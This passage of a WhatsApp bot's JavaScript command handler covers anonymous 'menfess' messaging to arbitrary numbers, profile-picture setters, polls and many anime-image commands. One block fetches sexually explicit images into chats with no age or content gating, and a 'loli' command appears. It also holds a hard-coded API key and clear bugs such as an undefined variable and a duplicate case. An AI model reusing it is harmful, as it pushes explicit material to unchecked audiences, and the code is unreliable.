case 'kill': case 'pat': case 'lick': case 'bite': case 'yeet': case 'bonk': case 'wink': case 'poke': case 'nom': case 'slap': case 'smile': case 'wave': case 'blush': case 'glomp': case 'happy': case 'dance': case 'cringe': case 'highfive': case 'handhold':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
await loading()
 axios.get(`https://api.waifu.pics/sfw/${command}`)
.then(({data}) => {
Al.sendImage(m.chat, data.url, '*හායි යාලුවනේ...👋😇*\n https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\n\n*✨මගෙ චැනල් එකට Join වෙන්න...💗*\n https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\n\n -𝐌𝐚𝐧𝐮𝐥 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥~', m)
})
}
limitAdd(m.sender, limit)
break
case "confes": case 'menfes': case 'menfess':{
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
this.menfes = this.menfes ? this.menfes : {}
roof = Object.values(this.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender))
if (roof) return m.reply("Kamu masih berada dalam sesi menfess")
if (m.isGroup) return m.reply('Fitur Khusus Di private chat!')
if (!text) return m.reply(`Kirim Perintah ${prefix + command} nama|nomor|pesan\n\nContoh :\n${prefix + command} ${pushname}|628xxx|Menfes nih\n`)
if (!text.includes('|')) return m.reply(`Kirim Perintah ${prefix + command} nama|nomor|pesan\n\nContoh :\n${prefix + command} ${pushname}|6281111111111|Menfes nih\n`)
let [namaNya, nomorNya, pesanNya] = text.split`|`
if (nomorNya.startsWith('0')) return m.reply(`Kirim Perintah ${prefix + command} nama|nomor|pesan\n\nContoh :\n${prefix + command} ${pushname}|628xxx|Menfes nih\n`)
if(isNaN(nomorNya)) return m.reply(`Kirim Perintah ${prefix + command} nama|nomor|pesan\n\nContoh :\n${prefix + command} ${pushname}|628xxx|Menfes nih\n`)
var yoi = `Hi ada menfess nih buat kamu\n\nDari : ${namaNya}\nPesan : ${pesanNya}\n\nSilahkan ketik ${prefix}balasmenfes -- Untuk menerima *menfess/confess*\nSilahkan ketik ${prefix}tolakmenfes -- Untuk menolak *menfess/confess*\n\n_Pesan ini di tulis oleh seseorang pengguna bot, bot hanya menyampaikan saja_`
let tod = await getBuffer('https://telegra.ph/file/72b973058c1985de0eda8.jpg') 
let id = m.sender
this.menfes[id] = {
id,
a: m.sender,
b: nomorNya + "@s.whatsapp.net",
state: 'WAITING'
}
 await Al.sendMessage(nomorNya + '@s.whatsapp.net', {image: tod, caption:yoi }, {})
m.reply('Done! Moga dibales ya')
}
break
case 'balasmenfess': case 'balasmenfes': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
let [namaNya, nomorNya, pesanNya] = text.split`|`
this.menfes[id] = {
id,
a: m.sender,
b: nomorNya + "@s.whatsapp.net",
state: 'WAITING'
}
roof = Object.values(this.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender))
if (!roof) return m.reply("_Belum ada sesi menfess_")
find = Object.values(this.menfes).find(menpes => menpes.state == 'WAITING')
let room = Object.values(this.menfes).find(room => [room.a, room.b].includes(m.sender) && room.state === 'WAITING')
let other = [room.a, room.b].find(user => user !== m.sender)
find.b = m.sender
find.state = 'CHATTING'
this.menfes[find.id] = {...find}
await Al.sendMessage(other, {text: `_@${m.sender.split("@")[0]} telah menerima menfess kamu, sekarang kamu bisa chat lewat bot ini_\n\n*NOTE :*\nJika ingin berhenti dari menfess, silahkan ketik *.stopmenfes*`, mentions: [m.sender]})
Al.sendMessage(m.chat, {text: `_Menfess telah diterima, sekarang kamu bisa chatan lewat bot ini_\n\n*NOTE :*\nJika ingin berhenti dari menfess, silahkan ketik *.stopmenfes*`})
}
break
 case 'tolakmenfess': case 'tolakmenfes': {
 if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
let [namaNya, nomorNya, pesanNya] = text.split`|`
this.menfes[id] = {
id,
a: m.sender,
b: nomorNya + "@s.whatsapp.net",
state: 'WAITING'
}
roof = Object.values(this.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender))
if (!roof) return m.reply("Belum ada sesi menfess")
let room = Object.values(this.menfes).find(room => [room.a, room.b].includes(m.sender) && room.state === 'WAITING')
let other = [room.a, room.b].find(user => user !== m.sender)
find = Object.values(this.menfes).find(menpes => menpes.state == 'Waiting')
Al.sendMessage(other, {text: `_Yahh... @${m.sender.split("@")[0]} Menolak menfess kamu ッ_`, mentions: [m.sender]})
// await Al.sendMessage(find.a, {text: `_Uppsss... @${find.b.split("@")[0]} Menolak menfess kamu_`,mentions: [find.b]})
m.reply("_Sukses Menolak Menfess_")
delete this.menfes[roof.id]
}
break
 case "stopconfes": case 'stopmenfes': {
 if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
let [namaNya, nomorNya, pesanNya] = text.split`|`
this.menfes[id] = {
id,
a: m.sender,
b: nomorNya + "@s.whatsapp.net",
state: 'WAITING'
}
 //find = Object.values(this.menfes).find(menpes => menpes.state == 'WAITING')
find = Object.values(this.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender))
if (!find) return m.reply("Belum ada sesi menfess")
const to = find.a == m.sender ? find.b : find.a
Al.sendMessage(to, {text: `_Teman chat telah menghentikan menfess ini_`, mentions:[m.sender]})
await m.reply("Oke udah")
delete this.menfes[find.id]
}
break
case 'cerpen':{
let item = await Cerpen()
let cap = `🔍 *[ RESULT ]* ${item}`
m.reply(`${cap}`)
}
break
case 'manusetppful': case 'manusetppbot2':{
if (!isCreator) return m.reply('Special For Owner Features!')
if (!quoted) return m.reply(`Reply foto dgn caption ${prefix + command}`)
if (!/image/.test(mime)) return m.reply(`Reply foto dgn caption ${prefix + command}`)
if (/webp/.test(mime)) return m.reply(`Reply foto dgn caption ${prefix + command}`)
let media = await Al.downloadAndSaveMediaMessage(quoted)
var { img } = await generateProfilePicture(media)
await Al.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
} 
]
})
aiRep2("Successfully!")
}
break
case 'setppbot': {
if (!isCreator) return m.reply(mess.OnlyOwner)
if (!quoted) return m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (!/image/.test(mime)) return m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (/webp/.test(mime)) return m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
let media = await Al.downloadAndSaveMediaMessage(quoted)
await Al.updateProfilePicture(botNumber, { url: media }).catch((err) => fs.unlinkSync(media))
aiRep("Successfully!")
}
break
case 'setppgroup': case 'setppgrup': case 'setppgc': {
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isAdmins) return m.reply('Fitur Khusus admin!')
if (!isBotAdmins) return m.reply(mess.BotAdmin)
if (!quoted) return m.reply (`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (!/image/.test(mime)) return m.reply (`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (/webp/.test(mime)) return m.reply (`Kirim/Reply Image Dengan Caption ${prefix + command}`)
let media = await Al.downloadAndSaveMediaMessage(quoted)
await Al.updateProfilePicture(m.chat, { url: media }).catch((err) => fs.unlinkSync(media))
aiRep("Successfully!")
}
break
case 'pppanjanggc': case 'setppgcful': case 'setppgc2':{
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isAdmins) return m.reply('Fitur Khusus admin!')
if (!isBotAdmins) return m.reply(mess.BotAdmin)
if (!quoted) return m.reply(`Reply foto dgn caption ${prefix + command}`)
if (!/image/.test(mime)) return m.reply(`Reply foto dgn caption ${prefix + command}`)
if (/webp/.test(mime)) return m.reply(`Reply foto dgn caption ${prefix + command}`)
let media = await Al.downloadAndSaveMediaMessage(quoted)
var { img } = await generateProfilePicture(media)
await Al.query({
tag: 'iq',
attrs: {
to: m.chat,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
} 
]
})
aiRep("Successfully!")
}
break
//========================
case 'pol1':
case 'poling1':
case 'polling1':
case 'poll1':{
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isAdmins) return m.reply('Fitur Khusus admin!')
if (!args[0]) return m.reply(`Tidak ada Teks untuk survei\n\n*Contoh :* \n*${prefix + command}* Pesan |Hai|Kak`)
if (!text.includes('|')) return m.reply(`Pisahkan polling dengan tanda *|* \n\n*Contoh :* \n*${prefix + command}* Keren |Iya|Enggak`)
let name = await Al.getName(m.sender)
let a = []
let b = text.split('|')
for (let c = 1 || 0; c < b.length; c++) {
a.push([b[c]])
}
return Al.sendPoll(m.chat, `*Nama :* ${name}\n\n*Pesan :* ${text.split('|')[0]}`, a, m)
}
break

case 'restart':
if (!isCreator) return m.reply('Khusus Creator')
m.reply(`Restart server...`)
await sleep(3000)
process.exit()
break

case 'genshin':
case 'swimsuit':
case 'schoolswimsuit':
case 'white':
case 'barefoot':
case 'touhou':
case 'gamecg':
case 'hololive':
case 'uncensored':
case 'sungglasses':
case 'glasses':
case 'weapon':
case 'shirtlift':
case 'chain':
case 'fingering':
case 'flatchest':
case 'torncloth':
case 'bondage':
case 'demon':
case 'pantypull':
case 'headdress':
case 'headphone':
case 'anusview':
case 'shorts':
case 'stokings':
case 'topless':
case 'beach':
case 'bunnygirl':
case 'bunnyear':
case 'vampire':
case 'nobra':
case 'bikini':
case 'whitehair':
case 'blonde':
case 'pinkhair':
case 'bed':
case 'ponytail':
case 'nude':
case 'dress':
case 'underwear':
case 'foxgirl':
case 'uniform':
case 'skirt':
case 'breast':
case 'twintail':
case 'spreadpussy':
case 'seethrough':
case 'breasthold':
case 'fateseries':
case 'spreadlegs':
case 'openshirt':
case 'headband':
case 'nipples':
case 'erectnipples':
case 'greenhair':
case 'wolfgirl':
case 'catgirl':
let res = await fetch(`https://fantox-apis.vercel.app/${command}`)
if (!res.ok) throw await res.text()
let json = await res.json()
if (!json.url) throw 'Error'
Al.sendFile(m.chat, json.url, 'img.jpg', `result image: ${command}`, m)
break

case 'enable': case 'disable':{
let db = `
┌「 _*⩽ GROUP ONLY ⩾*_
⩽⩾ antilink ${isAntiLink ? '☑️' : '✖️'}
⩽⩾ antipromo ${isAntiPromo ? '☑️' : '✖️'}
⩽⩾ antitoxic ${isAntiToxic ? '☑️' : '✖️'}
⩽⩾ autodlgc ${isAutoDlGc ? '☑️' : '✖️'}
⩽⩾ autosticker ${isAutoStiker ? '☑️' : '✖️'}
⩽⩾ mute ${isMute ? '☑️' : '✖️'}
⩽⩾ welcome ${isWelcome ? '☑️' : '✖️'}
⩽⩾ left ${isLeft ? '☑️' : '✖️'}
╰──  

*NOTE*
☑️ Status On
✖️ Status Off
`
aiRep2(`${db}`)
}
break
case 'jadibot': case 'start':{
let jdb = `Maaf Jadi Bot Tidak Tersedia di Versi ini`
m.reply(jdb)
}
break
//bikin atau salin bagian sini
case 'setmenu':{
               if (!isCreator) return m.reply('Special For Owner Features')
               if (!text) return m.reply(`Silahkan Pilih Set Menu Anda (v1, v2, v3, v4, v5, v6)\n\n*Example* ${prefix + command} v2`)
               if (text.startsWith('v')) {
                  typemenu = text
                  m.reply('*Set Menu Successfully...✓*')
               } else {
                  m.reply(`Pilih Versi Set Menu Anda (v1, v2, v3, v4, v5, v6)\nExample ${prefix + command} v2`)
               }
            }
            break
case 'setallmenu':{
               if (!isCreator) return m.reply('Special For Owner Features')
               if (!text) return m.reply(`Silahkan Pilih Set All Menu Anda (v1, v2, v3, v4, v5, v6)\n\n*Example* ${prefix + command} v2`)
               if (text.startsWith('v')) {
                  typeallmenu = text
                  m.reply('Sukses Set Allmenu')
               } else {
                  m.reply(`Pilih Versi Set Menu Anda (v1, v2, v3, v4, v5, v6)\nExample ${prefix + command} v2`)
               }
            }
            break
case 'userjid':{
          	if(!isCreator) return m.reply('Khusus Creator')
        const groupMetadata = m.isGroup ? await Al.groupMetadata(m.chat).catch((e) => {}) : ""
		const participants = m.isGroup ? await groupMetadata.participants : ""
    let textt = `jid semua pengguna _\n *- ${groupMetadata.subject}*\n\n`
    for (let mem of participants) {
            textt += ` ${mem.id}\n`
        }
      m.reply(textt)
    }
    break            
case 'telestick': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
		if (args[0] && args[0].match(/(https:\/\/t.me\/addstickers\/)/gi)) {
		let aibotzz = await Telesticker(args[0])
		await m.reply(`Sending ${aibotzz.length} stickers...`)
		if (aibotzz.length > 30) {
			await m.reply('Jumlah Sticker Lebih Dari 30 bot akan mengirim nya di private chat.')
			for (let i = 0; i < aibotzz.length; i++) {
				Al.sendMessage(m.sender, { sticker: { url: aibotzz[i].url }})
			}
		} else {
			for (let i = 0; i < aibotzz.length; i++) {
				Al.sendMessage(m.chat, { sticker: { url: aibotzz[i].url }})
			}
		}
	} else m.reply(`Dimana link stiker telegramnya?\nExample. ${prefix + command} https://t.me/addstickers/FriendlyDeath`)
}
break    

case 'akira': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return aiRep2(`Your limit is up, please send ${prefix}The limit to check the limit`)
const { akira } = require('./media/anime/akira') 
let akiranya = akira[Math.floor(Math.random() * akira.length)]
Al.sendMessage(m.chat, { image: { url: akiranya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'gichar': {			
			if (args.length == 0) return m.reply(`Example: ${prefix + command} jean`)
			m.reply('Loading')
			var { data } = await axios.get(`https://api.lolhuman.xyz/api/genshin/${fullargs}?apikey=elainaai`)
			var caption3 = `Name : ${data.result.title}\n`
			caption3 += `Intro : ${data.result.intro}\n`
			caption3 += `Icon : ${data.result.icon}\n`
			await Al.sendMessage(m.chat, { image: { url: data.result.cover1 }, caption3 })
			await Al.sendMessage(m.chat, { audio: { url: data.result.cv[0].audio[0] }, mimetype: 'audio/mp4' })
			}
break
case 'akiyama': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return aiRep2(`Your limit is up, please send ${prefix}The limit to check the limit`)
const { akiyama } = require('./media/anime/akiyama') 
let akiyamanya = akiyama[Math.floor(Math.random() * akiyama.length)]
Al.sendMessage(m.chat, { image: { url: akiyamanya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'ana': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return aiRep2(`Your limit is up, please send ${prefix}The limit to check the limit`)
const { ana } = require('./media/anime/ana') 
let ananya = ana[Math.floor(Math.random() * ana.length)]
Al.sendMessage(m.chat, { image: { url: ananya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'asuna': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return aiRep2(`Your limit is up, please send ${prefix}The limit to check the limit`)
const { asuna } = require('./media/anime/asuna') 
let asunanya = asuna[Math.floor(Math.random() * asuna.length)]
Al.sendMessage(m.chat, { image: { url: asunanya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'ayuzawa': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return aiRep2(`Your limit is up, please send ${prefix}The limit to check the limit`)
const { ayuzawa } = require('./media/anime/ayuzawa') 
let ayuzawanya = ayuzawa[Math.floor(Math.random() * ayuzawa.length)]
Al.sendMessage(m.chat, { image: { url: ayuzawanya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'boruto': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return aiRep2(`Your limit is up, please send ${prefix}The limit to check the limit`)
const { boruto } = require('./media/anime/boruto') 
let borutonya = boruto[Math.floor(Math.random() * boruto.length)]
Al.sendMessage(m.chat, { image: { url: borutonya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'chitanda': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return aiRep2(`Your limit is up, please send ${prefix}The limit to check the limit`)
const { chitanda } = require('./media/anime/chitanda') 
let chitandanya = chitanda[Math.floor(Math.random() * chitanda.length)]
Al.sendMessage(m.chat, { image: { url: chitandanya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'deidara': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return aiRep2(`Your limit is up, please send ${prefix}The limit to check the limit`)
const { deidara } = require('./media/anime/deidara') 
let deidaranya = deidara[Math.floor(Math.random() * deidara.length)]
Al.sendMessage(m.chat, { image: { url: deidaranya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'doraemon': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return aiRep2(`Your limit is up, please send ${prefix}The limit to check the limit`)
const { doraemon } = require('./media/anime/doraemon') 
let doraemonnya = doraemon[Math.floor(Math.random() * doraemon.length)]
Al.sendMessage(m.chat, { image: { url: doraemonnya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'elaina': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return aiRep2(`Your limit is up, please send ${prefix}The limit to check the limit`)
const { elaina } = require('./media/anime/elaina') 
let elainanya = elaina[Math.floor(Math.random() * elaina.length)]
Al.sendMessage(m.chat, { image: { url: elainanya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'emilia': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return aiRep2(`Your limit is up, please send ${prefix}The limit to check the limit`)
const { emilia } = require('./media/anime/emilia') 
let emilianya = emilia[Math.floor(Math.random() * emilia.length)]
Al.sendMessage(m.chat, { image: { url: emilianya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'erza': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return aiRep2(`Your limit is up, please send ${prefix}The limit to check the limit`)
const { erza } = require('./media/anime/erza') 
let erzanya = erza[Math.floor(Math.random() * erza.length)]
Al.sendMessage(m.chat, { image: { url: erzanya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'fanart': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return aiRep2(`Your limit is up, please send ${prefix}The limit to check the limit`)
const { fanart } = require('./media/anime/fanart') 
let fanartnya = fanart[Math.floor(Math.random() * fanart.length)]
Al.sendMessage(m.chat, { image: { url: fanartnya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'genshin': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return aiRep2(`Your limit is up, please send ${prefix}The limit to check the limit`)
const { genshin } = require('./media/anime/genshin') 
let genshinnya = genshin[Math.floor(Math.random() * genshin.length)]
Al.sendMessage(m.chat, { image: { url: genshinnya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'gremory': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return aiRep2(`Your limit is up, please send ${prefix}The limit to check the limit`)
const { gremory } = require('./media/anime/gremory') 
let gremorynya = gremory[Math.floor(Math.random() * gremory.length)]
Al.sendMessage(m.chat, { image: { url: gremorynya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'hestia': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return aiRep2(`Your limit is up, please send ${prefix}The limit to check the limit`)
const { hestia } = require('./media/anime/hestia') 
let hestianya = hestia[Math.floor(Math.random() * hestia.length)]
Al.sendMessage(m.chat, { image: { url: hestianya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'hinata': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return aiRep2(`Your limit is up, please send ${prefix}The limit to check the limit`)
const { hinata } = require('./media/anime/hinata') 
let hinatanya = hinata[Math.floor(Math.random() * hinata.length)]
Al.sendMessage(m.chat, { image: { url: hinatanya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'husbu': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return aiRep2(`Your limit is up, please send ${prefix}The limit to check the limit`)
const { husbu } = require('./media/anime/husbu') 
let husbunya = husbu[Math.floor(Math.random() * husbu.length)]
Al.sendMessage(m.chat, { image: { url: husbunya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'icon': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return aiRep2(`Your limit is up, please send ${prefix}The limit to check the limit`)
const { icon } = require('./media/anime/icon') 
let iconnya = icon[Math.floor(Math.random() * icon.length)]
Al.sendMessage(m.chat, { image: { url: iconnya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'inori': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return aiRep2(`Your limit is up, please send ${prefix}The limit to check the limit`)
const { inori } = require('./media/anime/inori') 
let inorinya = inori[Math.floor(Math.random() * inori.length)]
Al.sendMessage(m.chat, { image: { url: inorinya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'isuzu': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return aiRep2(`Your limit is up, please send ${prefix}The limit to check the limit`)
const { isuzu } = require('./media/anime/isuzu') 
let isuzunya = isuzu[Math.floor(Math.random() * isuzu.length)]
Al.sendMessage(m.chat, { image: { url: isuzunya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'itachi': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return aiRep2(`Your limit is up, please send ${prefix}The limit to check the limit`)
const { itachi } = require('./media/anime/itachi') 
let itachinya = itachi[Math.floor(Math.random() * itachi.length)]
Al.sendMessage(m.chat, { image: { url: itachinya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'itori': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return aiRep2(`Your limit is up, please send ${prefix}The limit to check the limit`)
const { itori } = require('./media/anime/itori') 
let itorinya = itori[Math.floor(Math.random() * itori.length)]
Al.sendMessage(m.chat, { image: { url: itorinya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'kaga': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return aiRep2(`Your limit is up, please send ${prefix}The limit to check the limit`)
const { kaga } = require('./media/anime/kaga') 
let kaganya = kaga[Math.floor(Math.random() * kaga.length)]
Al.sendMessage(m.chat, { image: { url: kaganya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
 case 'kagura': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return aiRep2(`Your limit is up, please send ${prefix}The limit to check the limit`)
const { kagura } = require('./media/anime/kagura') 
let kaguranya = kagura[Math.floor(Math.random() * kagura.length)]
Al.sendMessage(m.chat, { image: { url: kaguranya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'kaguya': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return aiRep2(`Your limit is up, please send ${prefix}The limit to check the limit`)
const { kaguya } = require('./media/anime/kaguya') 
let kaguyanya = kaguya[Math.floor(Math.random() * kaguya.length)]
Al.sendMessage(m.chat, { image: { url: kaguyanya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'kakasih': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return aiRep2(`Your limit is up, please send ${prefix}The limit to check the limit`)
const { kakasih } = require('./media/anime/kakasih') 
let kakasihnya = kakasih[Math.floor(Math.random() * kakasih.length)]
Al.sendMessage(m.chat, { image: { url: kakasihnya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'kaneki': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return aiRep2(`Your limit is up, please send ${prefix}The limit to check the limit`)
const { kaneki } = require('./media/anime/kaneki') 
let kanekinya = kaneki[Math.floor(Math.random() * kaneki.length)]
Al.sendMessage(m.chat, { image: { url: kanekinya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'kaori': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return aiRep2(`Your limit is up, please send ${prefix}The limit to check the limit`)
const { kaori } = require('./media/anime/kaori') 
let kaorinya = kaori[Math.floor(Math.random() * kaori.length)]
Al.sendMessage(m.chat, { image: { url: kaorinya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'keneki': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return aiRep2(`Your limit is up, please send ${prefix}The limit to check the limit`)
const { keneki } = require('./media/anime/keneki') 
let kenekinya = keneki[Math.floor(Math.random() * keneki.length)]
Al.sendMessage(m.chat, { image: { url: kenekinya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'kosaki': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return aiRep2(`Your limit is up, please send ${prefix}The limit to check the limit`)
const { kosaki } = require('./media/anime/kosaki') 
let kosakinya = kosaki[Math.floor(Math.random() * kosaki.length)]
Al.sendMessage(m.chat, { image: { url: kosakinya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'kotori': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return aiRep2(`Your limit is up, please send ${prefix}The limit to check the limit`)
const { kotori } = require('./media/anime/kotori') 
let kotorinya = kotori[Math.floor(Math.random() * kotori.length)]
Al.sendMessage(m.chat, { image: { url: kotorinya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'kuriyama': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return aiRep2(`Your limit is up, please send ${prefix}The limit to check the limit`)
const { kuriyama } = require('./media/anime/kuriyama') 
let kuriyamanya = kuriyama[Math.floor(Math.random() * kuriyama.length)]
Al.sendMessage(m.chat, { image: { url: kuriyamanya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'kuroha': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return aiRep2(`Your limit is up, please send ${prefix}The limit to check the limit`)
const { kuroha } = require('./media/anime/kuroha') 
let kurohanya = kuroha[Math.floor(Math.random() * kuroha.length)]
Al.sendMessage(m.chat, { image: { url: kurohanya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'kurumi': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return aiRep2(`Your limit is up, please send ${prefix}The limit to check the limit`)
const { kurumi } = require('./media/anime/kurumi') 
let kuruminya = kurumi[Math.floor(Math.random() * kurumi.length)]
Al.sendMessage(m.chat, { image: { url: kuruminya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'loli': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return aiRep2(`Your limit is up, please send ${prefix}The limit to check the limit`)
const { loli } = require('./media/anime/loli') 
let lolinya = loli[Math.floor(Math.random() * loli.length)]
Al.sendMessage(m.chat, { image: { url: lolinya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
